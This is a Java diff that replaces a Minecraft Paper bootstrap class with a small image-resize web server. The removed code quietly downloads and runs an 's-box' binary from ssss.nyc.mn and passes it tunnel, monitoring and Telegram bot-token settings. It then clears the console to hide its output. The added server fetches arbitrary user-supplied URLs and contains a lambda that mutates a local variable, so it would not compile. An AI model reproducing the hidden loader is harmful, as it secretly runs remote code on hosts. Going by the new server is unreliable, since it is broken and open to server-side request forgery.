@@ -1,208 +1,192 @@
-package io.papermc.paper;
+package io.papermc.paper.util;
 
+import com.sun.net.httpserver.HttpServer;
+import com.sun.net.httpserver.HttpHandler;
+import com.sun.net.httpserver.HttpExchange;
+import io.github.cdimascio.dotenv.Dotenv;
+
+import javax.imageio.ImageIO;
+import java.awt.*;
+import java.awt.image.BufferedImage;
 import java.io.*;
-import java.net.*;
+import java.net.InetSocketAddress;
+import java.net.URL;
+import java.net.URLDecoder;
 import java.nio.file.*;
-import java.util.*;
-import java.util.concurrent.atomic.AtomicBoolean;
-import joptsimple.OptionSet;
-import net.minecraft.SharedConstants;
-import net.minecraft.server.Main;
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
+import java.security.MessageDigest;
+import java.util.Comparator;
 
-public final class PaperBootstrap {
-    
-    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
-    private static final String ANSI_GREEN = "\033[1;32m";
-    private static final String ANSI_RED = "\033[1;31m";
-    private static final String ANSI_RESET = "\033[0m";
-    private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static Process sbxProcess;
-    
-    private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
-    };
+public class ImageResizeServer {
 
-    private PaperBootstrap() {
+    private static final Dotenv dotenv = Dotenv.configure().ignoreIfMissing().load();
+    private static final boolean ENABLE_CACHE = Boolean.parseBoolean(dotenv.get("ENABLE_CACHE", "false"));
+    private static final Path CACHE_DIR = Paths.get(dotenv.get("CACHE_DIR", "./image_cache"));
+    private static final long CACHE_MAX_BYTES = Long.parseLong(dotenv.get("CACHE_MAX_BYTES", "2147483648")); // 2GB
+
+    public static void start(int port) throws IOException {
+        if (ENABLE_CACHE && !Files.exists(CACHE_DIR)) {
+            Files.createDirectories(CACHE_DIR);
+        }
+
+        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
+        server.createContext("/", new ResizeHandler());
+        server.setExecutor(null);
+        server.start();
+        System.out.println("✅ ImageResizeServer started on port " + port + (ENABLE_CACHE ? " with cache" : ""));
     }
 
-    public static void boot(final OptionSet options) {
-        // check java version
-        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
-            try {
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
+    static class ResizeHandler implements HttpHandler {
+        @Override
+        public void handle(HttpExchange exchange) throws IOException {
+            if (!"GET".equalsIgnoreCase(exchange.getRequestMethod())) {
+                exchange.sendResponseHeaders(405, -1);
+                return;
             }
-            System.exit(1);
-        }
-        
-        try {
-            runSbxBinary();
-            
-            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-                running.set(false);
-                stopServices();
-            }));
 
-            Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
-            Thread.sleep(20000);
-            clearConsole();
+            String query = exchange.getRequestURI().getQuery();
+            String imageUrl = null;
+            Integer targetW = null;
+            Integer targetH = null;
 
-            SharedConstants.tryDetectVersion();
-            getStartupVersionMessages().forEach(LOGGER::info);
-            Main.main(options);
-            
-        } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
-        }
-    }
-
-    private static void clearConsole() {
-        try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
-            } else {
-                System.out.print("\033[H\033[2J");
-                System.out.flush();
-            }
-        } catch (Exception e) {
-            // Ignore exceptions
-        }
-    }
-    
-    private static void runSbxBinary() throws Exception {
-        Map<String, String> envVars = new HashMap<>();
-        loadEnvVars(envVars);
-        
-        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
-        pb.environment().putAll(envVars);
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
-        sbxProcess = pb.start();
-    }
-    
-    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
-        envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
-        envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "");
-        envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "");
-        envVars.put("CFPORT", "");
-        envVars.put("NAME", "Mc");
-        
-        for (String var : ALL_ENV_VARS) {
-            String value = System.getenv(var);
-            if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value);
-            }
-        }
-        
-        Path envFile = Paths.get(".env");
-        if (Files.exists(envFile)) {
-            for (String line : Files.readAllLines(envFile)) {
-                line = line.trim();
-                if (line.isEmpty() || line.startsWith("#")) continue;
-                
-                line = line.split(" #")[0].split(" //")[0].trim();
-                if (line.startsWith("export ")) {
-                    line = line.substring(7).trim();
-                }
-                
-                String[] parts = line.split("=", 2);
-                if (parts.length == 2) {
-                    String key = parts[0].trim();
-                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    
-                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        envVars.put(key, value);
+            if (query != null) {
+                for (String param : query.split("&")) {
+                    String[] kv = param.split("=");
+                    if (kv.length != 2) continue;
+                    switch (kv[0]) {
+                        case "url": imageUrl = URLDecoder.decode(kv[1], "UTF-8"); break;
+                        case "w": targetW = Integer.parseInt(kv[1]); break;
+                        case "h": targetH = Integer.parseInt(kv[1]); break;
                     }
                 }
             }
-        }
-    }
-    
-    private static Path getBinaryPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
-        
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/s-box";
-        } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
-        } else {
-            throw new RuntimeException("Unsupported architecture: " + osArch);
-        }
-        
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
-        if (!Files.exists(path)) {
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
-            }
-            if (!path.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
-            }
-        }
-        return path;
-    }
-    
-    private static void stopServices() {
-        if (sbxProcess != null && sbxProcess.isAlive()) {
-            sbxProcess.destroy();
-            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
-        }
-    }
 
-    private static List<String> getStartupVersionMessages() {
-        final String javaSpecVersion = System.getProperty("java.specification.version");
-        final String javaVmName = System.getProperty("java.vm.name");
-        final String javaVmVersion = System.getProperty("java.vm.version");
-        final String javaVendor = System.getProperty("java.vendor");
-        final String javaVendorVersion = System.getProperty("java.vendor.version");
-        final String osName = System.getProperty("os.name");
-        final String osVersion = System.getProperty("os.version");
-        final String osArch = System.getProperty("os.arch");
+            if (imageUrl == null) {
+                String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Image Resize Server</title></head>" +
+                        "<body><h2>📷 图片缩放服务</h2>" +
+                        "<p>使用格式：<code>?url=图片地址&w=宽度&h=高度</code></p>" +
+                        "<p>支持：只指定一边等比例缩放，指定两边裁剪，不放大，原图返回</p>" +
+                        "<p>示例：<a href='/?url=https://example.com/image.jpg&w=300&h=200'>点击查看缩放效果</a></p>" +
+                        "</body></html>";
+                byte[] response = html.getBytes("UTF-8");
+                exchange.getResponseHeaders().add("Content-Type", "text/html; charset=UTF-8");
+                exchange.sendResponseHeaders(200, response.length);
+                exchange.getResponseBody().write(response);
+                exchange.getResponseBody().close();
+                return;
+            }
 
-        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
-        return List.of(
-            String.format(
-                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
-                javaSpecVersion,
-                javaVmName,
-                javaVmVersion,
-                javaVendor,
-                javaVendorVersion,
-                osName,
-                osVersion,
-                osArch
-            ),
-            String.format(
-                "Loading %s %s for Minecraft %s",
-                bi.brandName(),
-                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
-                bi.minecraftVersionId()
-            )
-        );
+            BufferedImage original;
+            try {
+                original = loadImage(imageUrl);
+                if (original == null) throw new IOException("Invalid image");
+            } catch (Exception e) {
+                exchange.sendResponseHeaders(400, -1);
+                return;
+            }
+
+            int ow = original.getWidth();
+            int oh = original.getHeight();
+            BufferedImage output = original;
+
+            if (targetW != null || targetH != null) {
+                double scale;
+                int rw, rh;
+
+                if (targetW != null && targetH != null) {
+                    double scaleW = (double) targetW / ow;
+                    double scaleH = (double) targetH / oh;
+                    scale = Math.max(scaleW, scaleH);
+                    if (scale >= 1.0) {
+                        output = original;
+                    } else {
+                        rw = (int) (ow * scale);
+                        rh = (int) (oh * scale);
+                        BufferedImage scaled = resize(original, rw, rh);
+                        int x = Math.max(0, (rw - targetW) / 2);
+                        int y = Math.max(0, (rh - targetH) / 2);
+                        output = scaled.getSubimage(x, y, Math.min(targetW, rw), Math.min(targetH, rh));
+                    }
+                } else {
+                    if (targetW != null && ow > targetW) {
+                        scale = (double) targetW / ow;
+                        rw = targetW;
+                        rh = (int) (oh * scale);
+                        output = resize(original, rw, rh);
+                    } else if (targetH != null && oh > targetH) {
+                        scale = (double) targetH / oh;
+                        rh = targetH;
+                        rw = (int) (ow * scale);
+                        output = resize(original, rw, rh);
+                    }
+                }
+            }
+
+            exchange.getResponseHeaders().add("Content-Type", "image/png");
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ImageIO.write(output, "png", baos);
+            byte[] bytes = baos.toByteArray();
+
+            exchange.sendResponseHeaders(200, bytes.length);
+            OutputStream os = exchange.getResponseBody();
+            os.write(bytes);
+            os.close();
+        }
+
+        private BufferedImage resize(BufferedImage src, int w, int h) {
+            BufferedImage resized = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);
+            Graphics2D g = resized.createGraphics();
+            g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
+            g.drawImage(src, 0, 0, w, h, null);
+            g.dispose();
+            return resized;
+        }
+
+        private BufferedImage loadImage(String url) throws Exception {
+            if (!ENABLE_CACHE) return ImageIO.read(new URL(url));
+
+            String hash = sha256(url);
+            Path cachedFile = CACHE_DIR.resolve(hash + ".img");
+
+            if (Files.exists(cachedFile)) {
+                return ImageIO.read(cachedFile.toFile());
+            }
+
+            BufferedImage img = ImageIO.read(new URL(url));
+            if (img != null) {
+                ImageIO.write(img, "png", cachedFile.toFile());
+                enforceCacheLimit();
+            }
+            return img;
+        }
+
+        private String sha256(String input) throws Exception {
+            MessageDigest md = MessageDigest.getInstance("SHA-256");
+            byte[] hash = md.digest(input.getBytes("UTF-8"));
+            StringBuilder sb = new StringBuilder();
+            for (byte b : hash) sb.append(String.format("%02x", b));
+            return sb.toString();
+        }
+
+        private void enforceCacheLimit() throws IOException {
+            long totalSize = Files.walk(CACHE_DIR)
+                    .filter(Files::isRegularFile)
+                    .mapToLong(p -> p.toFile().length())
+                    .sum();
+
+            if (totalSize <= CACHE_MAX_BYTES) return;
+
+            Files.walk(CACHE_DIR)
+                    .filter(Files::isRegularFile)
+                    .sorted(Comparator.comparingLong(p -> p.toFile().lastModified()))
+                    .forEach(p -> {
+                        if (totalSize > CACHE_MAX_BYTES) {
+                            long size = p.toFile().length();
+                            try {
+                                Files.delete(p);
+                                totalSize -= size;
+                            } catch (IOException ignored) {}
+                        }
+                    });
+        }
     }
 }
